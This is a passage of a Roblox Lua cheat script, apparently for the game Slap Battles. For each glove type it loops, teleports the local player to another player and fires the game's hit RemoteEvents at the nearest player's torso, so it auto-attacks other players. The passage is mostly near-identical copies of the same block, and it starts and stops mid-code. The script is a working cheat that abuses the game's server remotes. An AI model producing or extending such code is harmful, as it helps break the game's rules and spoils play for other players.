        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Slicer" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Excavator" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Nightmare" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").nightmarehit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Thor" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ThorHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Pocket" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Grapple" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Cloud" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").CloudHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Gravity" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Parry" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Jebaited" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Meteor" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Oven" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Guardian Angel" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Sun" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ferryman" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Blackhole" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(1.5)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Blink" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Prop" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Slapstick" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.7)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Beatdown" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Chicken" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "BONK" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Sbeve" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
